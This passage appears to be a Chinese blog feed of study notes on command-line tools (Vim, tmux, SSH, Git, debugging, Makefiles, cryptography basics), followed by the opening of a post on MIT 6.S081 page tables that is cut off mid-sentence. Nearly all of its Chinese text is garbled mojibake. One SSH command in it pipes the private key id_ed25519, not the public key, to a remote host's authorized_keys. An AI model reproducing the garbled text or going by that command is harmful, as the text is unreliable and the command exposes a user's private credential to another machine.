‡æ‰€åœ¨çš„å­—æ¯ï¼Œåœ¨å¯è§†æ¨¡å¼ä¸‹åˆ™ä¼šåˆ é™¤é€‰ä¸­æ–‡å—ã€‚</p></blockquote><p><strong>ä¸€äº›éœ€è¦è®°å¿†çš„å‘½ä»¤ï¼š</strong></p><p><strong>ç§»åŠ¨ï¼š</strong></p><ul><li>åŸºæœ¬ç§»åŠ¨: hjkl ï¼ˆå·¦ï¼Œ ä¸‹ï¼Œ ä¸Šï¼Œ å³ï¼‰</li><li>è¯ï¼š w ï¼ˆä¸‹ä¸€ä¸ªè¯ï¼‰ï¼Œ b ï¼ˆè¯åˆï¼‰ï¼Œ e ï¼ˆè¯å°¾ï¼‰</li><li>è¡Œï¼š 0 ï¼ˆè¡Œåˆï¼‰ï¼Œ ^ ï¼ˆç¬¬ä¸€ä¸ªéç©ºæ ¼å­—ç¬¦ï¼‰ï¼Œ $ ï¼ˆè¡Œå°¾ï¼‰</li><li>å±å¹•ï¼š H ï¼ˆå±å¹•é¦–è¡Œï¼‰ï¼Œ M ï¼ˆå±å¹•ä¸­é—´ï¼‰ï¼Œ L ï¼ˆå±å¹•åº•éƒ¨ï¼‰</li><li>ç¿»é¡µï¼š Ctrl-u ï¼ˆä¸Šç¿»ï¼‰ï¼Œ Ctrl-d ï¼ˆä¸‹ç¿»ï¼‰</li><li>æ–‡ä»¶ï¼š gg ï¼ˆæ–‡ä»¶å¤´ï¼‰ï¼Œ G ï¼ˆæ–‡ä»¶å°¾ï¼‰</li><li>è¡Œæ•°ï¼š :{è¡Œæ•°}<CR> æˆ–è€… {è¡Œæ•°}G ({è¡Œæ•°}ä¸ºè¡Œæ•°)</li><li>æ‚é¡¹ï¼š % ï¼ˆæ‰¾åˆ°é…å¯¹ï¼Œæ¯”å¦‚æ‹¬å·æˆ–è€… /* */ ä¹‹ç±»çš„æ³¨é‡Šå¯¹ï¼‰</li><li>æŸ¥æ‰¾ï¼š f{å­—ç¬¦}ï¼Œ t{å­—ç¬¦}ï¼Œ F{å­—ç¬¦}ï¼Œ T{å­—ç¬¦}</li><li>æŸ¥æ‰¾/åˆ° å‘å‰/å‘å åœ¨æœ¬è¡Œçš„{å­—ç¬¦}</li><li>, / ; ç”¨äºå¯¼èˆªåŒ¹é…</li><li>æœç´¢: /{æ­£åˆ™è¡¨è¾¾å¼}, n / N ç”¨äºå¯¼èˆªåŒ¹é…</li></ul><p><strong>ç¼–è¾‘ï¼š</strong></p><ul><li>O / o åœ¨ä¹‹ä¸Š/ä¹‹ä¸‹æ’å…¥è¡Œ</li><li>d{ç§»åŠ¨å‘½ä»¤} åˆ é™¤ {ç§»åŠ¨å‘½ä»¤}</li><li>ä¾‹å¦‚ï¼Œ dw åˆ é™¤è¯, d$ åˆ é™¤åˆ°è¡Œå°¾, d0 åˆ é™¤åˆ°è¡Œå¤´ã€‚</li><li>c{ç§»åŠ¨å‘½ä»¤} æ”¹å˜ {ç§»åŠ¨å‘½ä»¤}</li><li>ä¾‹å¦‚ï¼Œ cw æ”¹å˜è¯</li><li>æ¯”å¦‚ d{ç§»åŠ¨å‘½ä»¤} å† i</li><li>x åˆ é™¤å­—ç¬¦ï¼ˆç­‰åŒäº dlï¼‰</li><li>s æ›¿æ¢å­—ç¬¦ï¼ˆç­‰åŒäº xiï¼‰</li><li>å¯è§†åŒ–æ¨¡å¼ + æ“ä½œ</li><li>é€‰ä¸­æ–‡å­—, d åˆ é™¤ æˆ–è€… c æ”¹å˜</li><li>u æ’¤é”€, <C-r> é‡åš</li><li>y å¤åˆ¶ / â€œyankâ€ ï¼ˆå…¶ä»–ä¸€äº›å‘½ä»¤æ¯”å¦‚ d ä¹Ÿä¼šå¤åˆ¶ï¼‰</li><li>p ç²˜è´´</li><li>æ›´å¤šå€¼å¾—å­¦ä¹ çš„: æ¯”å¦‚ ~ æ”¹å˜å­—ç¬¦çš„å¤§å°å†™</li></ul><p><a href="https://gls.show/p/4f2baa62/">https://gls.show/p/4f2baa62/</a></p><h1 id="Data-Wrangling"><a href="#Data-Wrangling" class="headerlink" title="Data Wrangling"></a>Data Wrangling</h1><ul><li>æ­£åˆ™è¡¨è¾¾å¼</li><li>sed</li><li>awk</li></ul><h1 id="Command-line-Environment"><a href="#Command-line-Environment" class="headerlink" title="Command-line Environment"></a>Command-line Environment</h1><p><strong>è¿›ç¨‹ä¸ä¿¡å·</strong></p><ul><li>ä¿¡å·æœºåˆ¶å¯ä»¥è¿›è¡Œè¿›ç¨‹é—´é€šä¿¡ï¼Œæ¯”å¦‚å½“æˆ‘ä»¬è¾“å…¥ Ctrl-C æ—¶ï¼Œshell ä¼šå‘é€ä¸€ä¸ªSIGINT ä¿¡å·åˆ°è¿›ç¨‹<ul><li>å½“ä¸€ä¸ªè¿›ç¨‹æ¥æ”¶åˆ°ä¿¡å·æ—¶ï¼Œå®ƒä¼šåœæ­¢æ‰§è¡Œã€å¤„ç†è¯¥ä¿¡å·å¹¶åŸºäºä¿¡å·ä¼ é€’çš„ä¿¡æ¯æ¥æ”¹å˜å…¶æ‰§è¡Œã€‚å°±è¿™ä¸€ç‚¹è€Œè¨€ï¼Œä¿¡å·æ˜¯ä¸€ç§è½¯ä»¶ä¸­æ–­</li></ul></li><li>SIGSTOPå¯ä»¥è®©è¿›ç¨‹æš‚åœï¼ˆctrl+zï¼‰ï¼Œå¯ä»¥é…åˆfgï¼ˆå‰å°ç»§ç»­ï¼‰ã€bgï¼ˆåå°ç»§ç»­ï¼‰æ¢å¤è¢«æš‚åœçš„å·¥ä½œ<ul><li>åå°è¿›ç¨‹ä»ç„¶æ˜¯ç»ˆç«¯è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œå…³é—­ç»ˆç«¯åè¯¥è¿›ç¨‹ä¹Ÿä¼šè¢«ç»ˆæ­¢</li><li>ä¸ºäº†é˜²æ­¢ä¸Šè¿°äº‹æƒ…ï¼Œå¯ä»¥ä½¿ç”¨nohupè¿è¡Œç¨‹åºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨disownï¼ˆå¯¹äºå·²è¿è¡Œçš„ç¨‹åºï¼‰</li></ul></li><li>jobsåˆ—å‡ºå½“å‰ç»ˆç«¯ä¼šè¯çš„å°šæœªå®Œæˆçš„å…¨éƒ¨ä»»åŠ¡ï¼Œecho $!æ‰“å°å‡ºæœ€è¿‘çš„ä»»åŠ¡çš„pid</li><li>&amp;å¯ä»¥è®©ç¨‹åºåœ¨åå°è¿è¡Œ</li></ul><p><strong>ç»ˆç«¯å¤šè·¯å¤ç”¨</strong></p><p><strong>å¯è§ <a href="https://gls.show/p/34c553/">è®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾â€”â€”Tmux</a></strong></p><p>ä¼šè¯ - æ¯ä¸ªä¼šè¯éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å·¥ä½œåŒºï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªçª—å£</p><ul><li>tmux å¼€å§‹ä¸€ä¸ªæ–°çš„ä¼šè¯</li><li>tmux new -s NAME ä»¥æŒ‡å®šåç§°å¼€å§‹ä¸€ä¸ªæ–°çš„ä¼šè¯</li><li>tmux ls åˆ—å‡ºå½“å‰æ‰€æœ‰ä¼šè¯</li><li>åœ¨ tmux ä¸­è¾“å…¥ <C-b> d ï¼Œå°†å½“å‰ä¼šè¯åˆ†ç¦»</li><li>tmux a é‡æ–°è¿æ¥æœ€åä¸€ä¸ªä¼šè¯ã€‚æ‚¨ä¹Ÿå¯ä»¥é€šè¿‡ -t æ¥æŒ‡å®šå…·ä½“çš„ä¼šè¯</li></ul><p>çª—å£ - ç›¸å½“äºç¼–è¾‘å™¨æˆ–æ˜¯æµè§ˆå™¨ä¸­çš„æ ‡ç­¾é¡µï¼Œä»è§†è§‰ä¸Šå°†ä¸€ä¸ªä¼šè¯åˆ†å‰²ä¸ºå¤šä¸ªéƒ¨åˆ†</p><ul><li><C-b> c åˆ›å»ºä¸€ä¸ªæ–°çš„çª—å£ï¼Œä½¿ç”¨ <C-d>å…³é—­</li><li><C-b> N è·³è½¬åˆ°ç¬¬ N ä¸ªçª—å£ï¼Œæ³¨æ„æ¯ä¸ªçª—å£éƒ½æ˜¯æœ‰ç¼–å·çš„</li><li><C-b> p åˆ‡æ¢åˆ°å‰ä¸€ä¸ªçª—å£</li><li><C-b> n åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçª—å£</li><li><C-b> , é‡å‘½åå½“å‰çª—å£</li><li><C-b> w åˆ—å‡ºå½“å‰æ‰€æœ‰çª—å£<br>é¢æ¿ - åƒ vim ä¸­çš„åˆ†å±ä¸€æ ·ï¼Œé¢æ¿ä½¿æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªå±å¹•é‡Œæ˜¾ç¤ºå¤šä¸ª shell</li><li><C-b> â€œ æ°´å¹³åˆ†å‰²</li><li><C-b> % å‚ç›´åˆ†å‰²</li><li><C-b> &lt;æ–¹å‘&gt; åˆ‡æ¢åˆ°æŒ‡å®šæ–¹å‘çš„é¢æ¿ï¼Œ&lt;æ–¹å‘&gt; æŒ‡çš„æ˜¯é”®ç›˜ä¸Šçš„æ–¹å‘é”®</li><li><C-b> z åˆ‡æ¢å½“å‰é¢æ¿çš„ç¼©æ”¾</li><li><C-b> [ å¼€å§‹å¾€å›å·åŠ¨å±å¹•ã€‚æ‚¨å¯ä»¥æŒ‰ä¸‹ç©ºæ ¼é”®æ¥å¼€å§‹é€‰æ‹©ï¼Œå›è½¦é”®å¤åˆ¶é€‰ä¸­çš„éƒ¨åˆ†</li><li><C-b> &lt;ç©ºæ ¼&gt; åœ¨ä¸åŒçš„é¢æ¿æ’å¸ƒé—´åˆ‡æ¢</li></ul><p>åˆ«å</p><ul><li>aliaså¯ä»¥ç»™é•¿å‘½ä»¤å–åˆ«åï¼Œæ¯”å¦‚alias ls=â€œls -al;pwdâ€ï¼Œæ³¨æ„åˆ°ç­‰å·ä¸¤éæ²¡æœ‰ç©ºæ ¼</li><li>unaliasç¦ç”¨åˆ«å</li><li>ä¸ºäº†è®©åˆ«åæŒç»­ç”Ÿæ•ˆï¼Œéœ€è¦æŠŠåˆ«åæ”¾åˆ°.bashrcç­‰shellçš„å¯åŠ¨æ–‡ä»¶ä¸­</li></ul><p>é…ç½®æ–‡ä»¶ï¼ˆDotfileï¼Œç‚¹æ–‡ä»¶ï¼‰</p><p>å¾ˆå¤šç¨‹åºçš„é…ç½®éƒ½æ˜¯æœ‰å¯¹åº”çš„é…ç½®æ–‡ä»¶çš„ï¼Œä»¥ç‚¹å¼€å¤´ï¼Œæ¯”å¦‚ï¼š</p><ul><li>bash - ~/.bashrc, ~/.bash_profile</li><li>git - ~/.gitconfig</li><li>vim - ~/.vimrc å’Œ ~/.vim ç›®å½•</li><li>ssh - ~/.ssh/config</li><li>tmux - ~/.tmux.conf</li></ul><p>é…ç½®æ–‡ä»¶å¯ä»¥æ–¹ä¾¿ç§»æ¤ï¼Œå®šåˆ¶åŒ–ç­‰</p><p><strong>è¿œç¨‹ç™»å½•</strong></p><ul><li>ssh user@ip commandå¯ä»¥ä»¥userçš„èº«ä»½æ‰§è¡Œcommand</li><li>sshå¯ä»¥é…ç½®å…å¯†ç™»å½•</li><li>ssh-keygenå‘½ä»¤å¯ä»¥ç”Ÿæˆä¸€å¯¹rsaç§˜é’¥</li><li>ssh ä¼šæŸ¥è¯¢ .ssh/authorized_keys æ¥ç¡®è®¤é‚£äº›ç”¨æˆ·å¯ä»¥è¢«å…è®¸ç™»å½•ï¼Œéœ€è¦å°†å…¬é’¥æ‹·è´åˆ°æ­¤å¤„</li><li>scpå‘½ä»¤å¯ä»¥æ‹·è´æ–‡ä»¶</li><li>rsyncæ˜¯scpçš„æ”¹è¿›ç‰ˆï¼Œå¯ä»¥å®ç°æ–­ç‚¹ç»­ä¼ ã€é˜²æ­¢é‡å¤æ‹·è´ç­‰åŠŸèƒ½</li><li>ç¼–è¾‘.ssh/configæ–‡ä»¶å¯ä»¥ç»™ç»™éœ€è¦è¿æ¥çš„è¿œç¨‹æœåŠ¡å™¨ã€ç”¨æˆ·å–åˆ«åï¼Œç®€åŒ–å‘½ä»¤</li></ul><p>æ‹·è´å…¬é’¥çš„ä¸¤ä¸ªå‘½ä»¤ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">cat .ssh<span class="hljs-operator">/</span>id_ed25519 <span class="hljs-operator">|</span> ssh foobar<span class="hljs-variable">@remote</span> <span class="hljs-string">&#x27;cat &gt;&gt; ~/.ssh/authorized_keys&#x27;</span><br><br>ssh<span class="hljs-operator">-</span><span class="hljs-keyword">copy</span><span class="hljs-operator">-</span>id <span class="hljs-operator">-</span>i .ssh<span class="hljs-operator">/</span>id_ed25519.pub foobar<span class="hljs-variable">@remote</span><br></code></pre></td></tr></table></figure><h1 id="Version-Control-Git"><a href="#Version-Control-Git" class="headerlink" title="Version Control (Git)"></a>Version Control (Git)</h1><p>ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ä½œç”¨ï¼š</p><ul><li>è¿½è¸ªé¡¹ç›®çš„ä¿®æ”¹å†å²</li><li>æŸ¥çœ‹æŸè¡Œä»£ç ç¼–è¾‘çš„æ—¶é—´å’Œäºº</li><li>åˆ›å»ºé¡¹ç›®å¿«ç…§ã€å¤šäººåˆä½œã€åˆ†æ”¯å¼€å‘ç­‰</li></ul><p>Gitçš„ç‰¹ç‚¹ï¼š</p><ul><li>Git åœ¨å‚¨å­˜æ•°æ®æ—¶ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šåŸºäºå®ƒä»¬çš„ SHA-1 å“ˆå¸Œ è¿›è¡Œå¯»å€</li><li>ç»™è¿™äº›å“ˆå¸Œå€¼èµ‹äºˆäººç±»å¯è¯»çš„åå­—ï¼Œä¹Ÿå°±æ˜¯å¼•ç”¨ï¼ˆreferencesï¼‰ï¼Œæ¯”å¦‚master å¼•ç”¨é€šå¸¸ä¼šæŒ‡å‘ä¸»åˆ†æ”¯çš„æœ€æ–°ä¸€æ¬¡æäº¤</li><li>å½“å‰ä½ç½®çš„ç´¢å¼•ï¼šHEAD</li></ul><p>è¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒ<a href="https://gls.show/p/3645f6a9/">https://gls.show/p/3645f6a9/</a></p><h1 id="Debugging-and-Profiling"><a href="#Debugging-and-Profiling" class="headerlink" title="Debugging and Profiling"></a>Debugging and Profiling</h1><blockquote><p>æœ€æœ‰æ•ˆçš„ debug å·¥å…·å°±æ˜¯ç»†è‡´çš„åˆ†æï¼Œé…åˆæ°å½“ä½ç½®çš„æ‰“å°è¯­å¥</p></blockquote><p>è°ƒè¯•ä»£ç çš„æ–¹å¼ï¼š</p><ul><li><p>printå¤§æ³•å¥½</p></li><li><p>æ—¥å¿—ï¼Œæ¯”å¦‚journalctlå¯ä»¥æŸ¥è¯¢ç³»ç»Ÿæ—¥å¿—ï¼Œå¯ä»¥é…åˆæ­£åˆ™è¿›è¡ŒåŒ¹é…</p></li><li><p>å¯ä»¥é€šè¿‡å½©è‰²çš„ç»ˆç«¯è¾“å‡ºæ›´å¥½çš„åˆ†æè°ƒè¯•ï¼ˆéœ€è¦ç»ˆç«¯çš„å½©è‰²é…ç½®ï¼‰</p></li><li><p>lnavæä¾›äº†æ˜“äºæŸ¥çœ‹çš„æ—¥å¿—<br><img src="/image/lnav-front-page.png"></p></li><li><p>ä¸€äº›è°ƒè¯•å™¨ï¼šgdbã€pwngdbã€pdb</p></li><li><p>åˆ†æç³»ç»Ÿè°ƒç”¨ï¼šstrace</p></li><li><p>webå¼€å‘ï¼šä½¿ç”¨Chromeçš„å¼€å‘è€…å·¥å…·</p></li><li><p>pythonçš„ pycallgraphå¯ä»¥ç”Ÿæˆå¦‚ä¸‹çš„è°ƒç”¨å›¾å’Œæµç¨‹å›¾ï¼š<br><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/A_Call_Graph_generated_by_pycallgraph.png"></p></li></ul><p>èµ„æºç›‘æ§ï¼š</p><ul><li>htopï¼Œæ³¨æ„åˆ°ä¸€äº›å¿«æ·é”®çš„ä½¿ç”¨ï¼Œæ¯”å¦‚<F6> è¿›ç¨‹æ’åºã€ t æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„å’Œ h æ‰“å¼€æˆ–æŠ˜å çº¿ç¨‹</li><li>glance</li><li>iotopå¯ä»¥æ˜¾ç¤ºå®æ—¶ I/O å ç”¨ä¿¡æ¯è€Œä¸”å¯ä»¥éå¸¸æ–¹ä¾¿åœ°æ£€æŸ¥æŸä¸ªè¿›ç¨‹æ˜¯å¦æ­£åœ¨æ‰§è¡Œå¤§é‡çš„ç£ç›˜è¯»å†™æ“ä½œ</li><li>df å¯ä»¥æ˜¾ç¤ºæ¯ä¸ªåˆ†åŒºçš„ä¿¡æ¯ï¼Œè€Œ du åˆ™å¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ¯ä¸ªæ–‡ä»¶çš„ç£ç›˜ä½¿ç”¨æƒ…å†µï¼ˆ disk usageï¼‰ã€‚-h é€‰é¡¹å¯ä»¥ä½¿å‘½ä»¤ä»¥å¯¹äººç±»ï¼ˆhumanï¼‰æ›´åŠ å‹å¥½çš„æ ¼å¼æ˜¾ç¤ºæ•°æ®ï¼›ncduæ˜¯ä¸€ä¸ªäº¤äº’æ€§æ›´å¥½çš„ du ï¼Œå®ƒå¯ä»¥è®©æ‚¨åœ¨ä¸åŒç›®å½•ä¸‹å¯¼èˆªã€åˆ é™¤æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</li><li>lsof å¯ä»¥åˆ—å‡ºè¢«è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ä¿¡æ¯ã€æŸ¥çœ‹æ–‡ä»¶æ˜¯è¢«å“ªä¸ªè¿›ç¨‹æ‰“å¼€çš„</li></ul><h1 id="Metaprogramming"><a href="#Metaprogramming" class="headerlink" title="Metaprogramming"></a>Metaprogramming</h1><p>æ„å»ºç³»ç»Ÿï¼Œä»¥makefileä¸ºä¾‹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">paper.pdf: paper.tex plot-data.png<br>pdflatex paper.tex<br><br>plot-%<span class="hljs-string">.png</span>: %<span class="hljs-string">.dat</span> plot.py<br><span class="hljs-string">./plot.py</span> -i $*<span class="hljs-string">.dat</span> -o $@<br></code></pre></td></tr></table></figure><ul><li>å·¦ä¾§æ˜¯æ„å»ºç›®æ ‡ï¼Œå³ä¾§æ˜¯æ„å»ºç›®æ ‡æ‰€éœ€è¦çš„ä¾èµ–</li><li>ç¼©è¿›çš„éƒ¨åˆ†æ˜¯ä¸Šè¿°è¿‡ç¨‹æ‰€éœ€è¦çš„ç¨‹åº</li><li><code>%</code>ä¼šåŒ¹é…å·¦å³ä¸¤ç«¯ç›¸åŒçš„å­—ç¬¦ä¸²<ul><li>å¦‚æœç›®æ ‡æ˜¯ plot-foo.pngï¼Œ make ä¼šå»å¯»æ‰¾ foo.dat å’Œ plot.py ä½œä¸ºä¾èµ–</li></ul></li></ul><p>ä¾èµ–ç®¡ç†</p><ul><li>è¯­ä¹‰ç‰ˆæœ¬å·ï¼šä¸»ç‰ˆæœ¬å·.æ¬¡ç‰ˆæœ¬å·.è¡¥ä¸å·ï¼Œæ¯”å¦‚8.1.3</li><li>å‡è®¾é¡¹ç›®ä¾èµ–A,Aæœ‰ç‰ˆæœ¬Bï¼Œé‚£ä¹ˆåªè¦Bçš„ä¸»ç‰ˆæœ¬å·å’ŒAç›¸åŒï¼Œæ¬¡ç‰ˆæœ¬å·ä¸ä½äºAä¸€èˆ¬æ¥è¯´å³å¯ä½¿ç”¨<ul><li> å¦‚æœæˆ‘ä¾èµ–çš„ç‰ˆæœ¬æ˜¯1.3.7ï¼Œé‚£ä¹ˆä½¿ç”¨1.3.8ã€1.6.1ï¼Œç”šè‡³æ˜¯1.3.0éƒ½æ˜¯å¯ä»¥çš„ã€‚å¦‚æœç‰ˆæœ¬å·æ˜¯ 2.2.4 å°±ä¸ä¸€å®šèƒ½ç”¨</li></ul></li><li>é”æ–‡ä»¶ï¼ˆlock filesï¼‰ï¼šé”æ–‡ä»¶åˆ—å‡ºäº†æ‚¨å½“å‰æ¯ä¸ªä¾èµ–æ‰€å¯¹åº”çš„å…·ä½“ç‰ˆæœ¬å·ï¼Œéœ€è¦æ‰§è¡Œå‡çº§ç¨‹åºæ‰èƒ½æ›´æ–°ä¾èµ–çš„ç‰ˆæœ¬</li></ul><p>æŒç»­é›†æˆ</p><ul><li>CIï¼ˆcontinuous integration æŒç»­é›†æˆï¼‰<ul><li><blockquote><p>æœ¬è¯¾ç¨‹çš„ç½‘ç«™åŸºäº GitHub Pages æ„å»ºï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚Pages åœ¨æ¯æ¬¡masteræœ‰ä»£ç æ›´æ–°æ—¶ï¼Œä¼šæ‰§è¡Œ Jekyll åšå®¢è½¯ä»¶ï¼Œç„¶åä½¿æ‚¨çš„ç«™ç‚¹å¯ä»¥é€šè¿‡æŸä¸ª GitHub åŸŸåæ¥è®¿é—®ã€‚å¯¹äºæˆ‘ä»¬æ¥è¯´è¿™äº›äº‹æƒ…å¤ªçç¢äº†ï¼Œæˆ‘ç°åœ¨æˆ‘ä»¬åªéœ€è¦åœ¨æœ¬åœ°è¿›è¡Œä¿®æ”¹ï¼Œç„¶åä½¿ç”¨ git æäº¤ä»£ç ï¼Œå‘å¸ƒåˆ°è¿œç«¯ã€‚CI ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬å¤„ç†åç»­çš„äº‹æƒ…ã€‚</p></blockquote></li><li>Git å¯ä»¥ä½œä¸ºä¸€ä¸ªç®€å•çš„ CI ç³»ç»Ÿæ¥ä½¿ç”¨ï¼Œåœ¨ä»»ä½• git ä»“åº“ä¸­çš„ .git/hooks ç›®å½•ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›æ–‡ä»¶ï¼ˆå½“å‰å¤„äºæœªæ¿€æ´»çŠ¶æ€ï¼‰ï¼Œå®ƒä»¬çš„ä½œç”¨å’Œè„šæœ¬ä¸€æ ·ï¼Œå½“æŸäº›äº‹ä»¶å‘ç”Ÿæ—¶ä¾¿å¯ä»¥è‡ªåŠ¨æ‰§è¡Œ</li></ul></li></ul><h1 id="Security-and-Cryptography"><a href="#Security-and-Cryptography" class="headerlink" title="Security and Cryptography"></a>Security and Cryptography</h1><ul><li>æ•£åˆ—å‡½æ•°<ul><li>å¯†é’¥ç”Ÿæˆå‡½æ•° (Key Derivation Functions) </li><li>æ–‡ä»¶çš„ä¿¡æ¯æ‘˜è¦(Message digest)</li><li>Gitä¸­çš„å†…å®¹å¯»å€å­˜å‚¨(Content addressed storage)</li></ul></li><li>å¯¹ç§°åŠ å¯†</li><li>éå¯¹ç§°åŠ å¯†<ul><li>PGPç”µå­é‚®ä»¶åŠ å¯†ï¼Œå…¬å¸ƒå…¬é’¥ï¼Œå®ç°ç”µå­é‚®ä»¶åŠ å¯†</li><li>è½¯ä»¶ç­¾åï¼ŒéªŒè¯ä¸‹è½½çš„è½¯ä»¶</li></ul></li><li>å¯†ç ç®¡ç†å™¨ï¼Œæ¯”å¦‚keepass</li><li>ä¸¤æ­¥éªŒè¯</li><li>sshï¼ˆéå¯¹ç§°ç­¾åæ¥éªŒè¯ç”¨æˆ·èº«ä»½ï¼‰<h1 id="Potpourri"><a href="#Potpourri" class="headerlink" title="Potpourri"></a>Potpourri</h1></li><li>ä¿®æ”¹é”®ä½æ˜ å°„<ul><li>Vimç»å¸¸ç”¨åˆ°escapeé”®ä½†æ˜¯å¤ªè¿œäº†ï¼Œå› æ­¤å¯ä»¥å°†escapeä¸capsé”®æ›¿æ¢ã€‚é€šå¸¸è¿™ä¸ªåŠŸèƒ½ç”±åœ¨è®¡ç®—æœºä¸Šè¿è¡Œçš„è½¯ä»¶å®ç°ã€‚å½“æŸä¸€ä¸ªæŒ‰é”®è¢«æŒ‰ä¸‹ï¼Œè½¯ä»¶æˆªè·é”®ç›˜å‘å‡ºçš„æŒ‰é”®äº‹ä»¶ï¼ˆkeypress eventï¼‰å¹¶ä½¿ç”¨å¦å¤–ä¸€ä¸ªäº‹ä»¶å–ä»£</li></ul></li><li>å®ˆæŠ¤è¿›ç¨‹<ul><li>æŒ‡åå°æŒç»­è¿è¡Œçš„ç¨‹åºï¼Œä¸€èˆ¬ä»¥ d ç»“å°¾ï¼Œæ¯”å¦‚ SSH æœåŠ¡ç«¯ sshdï¼Œç”¨æ¥ç›‘å¬ä¼ å…¥çš„ SSH è¿æ¥è¯·æ±‚å¹¶å¯¹ç”¨æˆ·è¿›è¡Œé‰´æƒ</li><li>systemdï¼ˆï¼ˆthe system daemonï¼‰ï¼‰ é…ç½®æ–‡ä»¶çš„è¯¦ç»†æŒ‡å—å¯å‚è§ freedesktop.org</li><li>å®šæœŸè¿è¡Œç¨‹åºå¯ä»¥ä½¿ç”¨cron</li></ul></li><li>è®¡ç®—æœºå¯åŠ¨æ—¶ï¼ŒBIOS æˆ–è€… UEFI ä¼šåœ¨åŠ è½½æ“ä½œç³»ç»Ÿä¹‹å‰å¯¹ç¡¬ä»¶ç³»ç»Ÿè¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™è¢«ç§°ä¸ºå¼•å¯¼ï¼ˆbootingï¼‰ã€‚ä½ å¯ä»¥é€šè¿‡æŒ‰ä¸‹è®¡ç®—æœºæç¤ºçš„é”®ä½ç»„åˆæ¥é…ç½®å¼•å¯¼ï¼Œæ¯”å¦‚ Press F9 to configure BIOS. Press F12 to enter boot menu</li><li>äº¤äº’å¼è®°äº‹æœ¬ã€‚æ¯”å¦‚Jupyterï¼Œå®ƒçš„åå­—æ¥æºäºæ‰€æ”¯æŒçš„ä¸‰ç§æ ¸å¿ƒè¯­è¨€ï¼šJuliaã€Pythonã€Rï¼ˆJuPyteRï¼‰</li><li>GitHub</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081ï¼šLab3 page table</title>
    <link href="/p/c98013d5/"/>
    <url>/p/c98013d5/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab3-pgtable"><a href="#Lab3-pgtable" class="headerlink" title="Lab3 pgtable"></a>Lab3 pgtable</h1><p>å†™åœ¨labå¼€å§‹ä¹‹å‰ï¼š</p><ul><li><del>è¿™ä¸ªlabå¾ˆæ˜æ˜¾å’Œå‰é¢ä¸æ˜¯ä¸€ä¸ªéš¾åº¦</del></li><li>éœ€è¦è¡¥å……ä¸€äº›è™šæ‹Ÿå†…å­˜çš„çŸ¥è¯†<ul><li>çœ‹ä¸€ä¸‹é…å¥—çš„xv6æŒ‡å¯¼æ‰‹å†Œ</li><li>Bç«™çš„è¯¾ç¨‹è§†é¢‘å½•æ’­</li></ul></li></ul><h2 id="é¡µè¡¨"><a href="#é¡µè¡¨" class="headerlink" title="é¡µè¡¨"></a>é¡µè¡¨</h2><p>è™šæ‹Ÿåœ°å€ä¸­é—´çš„indexæœ‰27ä½ï¼Œå› æ­¤é¡µè¡¨é¡¹å°±æœ‰<code>2^27</code>ä¸ªï¼Œä¹Ÿå³æ˜¯<code>0~2^27-1</code>ï¼Œå°†indexå¯¹åº”çš„PPNå–å‡ºå’Œoffsetæ‹¼åœ¨ä¸€èµ·å°±æˆäº†PAï¼ˆphysical addressï¼‰</p><p>xv6 è¿è¡Œåœ¨ Sv39 RISC-V ä¸Šï¼Œè¿™æ„å‘³ç€åªä½¿ç”¨ 64 ä½è™šæ‹Ÿåœ°å€çš„åº•éƒ¨ 39 ä½ï¼Œé¡¶éƒ¨ 25 ä½æœªè¢«ä½¿ç”¨ã€‚å› æ­¤ä¸‹é¢å›¾ä¸­åªéœ€è¦å…³æ³¨ä½39ä½</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551847.png"></p><p>åˆšåˆšæ˜¯å•çº§é¡µè¡¨ï¼Œä½†æ˜¯å‡ºäºä¸€äº›è€ƒè™‘ï¼Œxv6ä½¿ç”¨ä¸‰çº§é¡µè¡¨çš„æ˜ å°„æ–¹å¼</p><p>Qï¼š3çº§page tableä¸ºä»€ä¹ˆä¼šæ¯”ä¸€ä¸ªè¶…å¤§çš„page tableæ›´å¥½å‘¢ï¼Ÿ</p><blockquote><p>Fransæ•™æˆï¼šè¿™æ˜¯ä¸ªå¥½é—®é¢˜ï¼Œè¿™çš„åŸå› æ˜¯ï¼Œ3çº§page tableä¸­ï¼Œå¤§é‡çš„PTEéƒ½å¯ä»¥ä¸å­˜å‚¨ã€‚æ¯”å¦‚ï¼Œå¯¹äºæœ€é«˜çº§çš„page tableé‡Œé¢ï¼Œå¦‚æœä¸€ä¸ªPTEä¸ºç©ºï¼Œé‚£ä¹ˆä½ å°±å®Œå…¨ä¸ç”¨åˆ›å»ºå®ƒå¯¹åº”çš„ä¸­é—´çº§å’Œæœ€åº•å±‚page 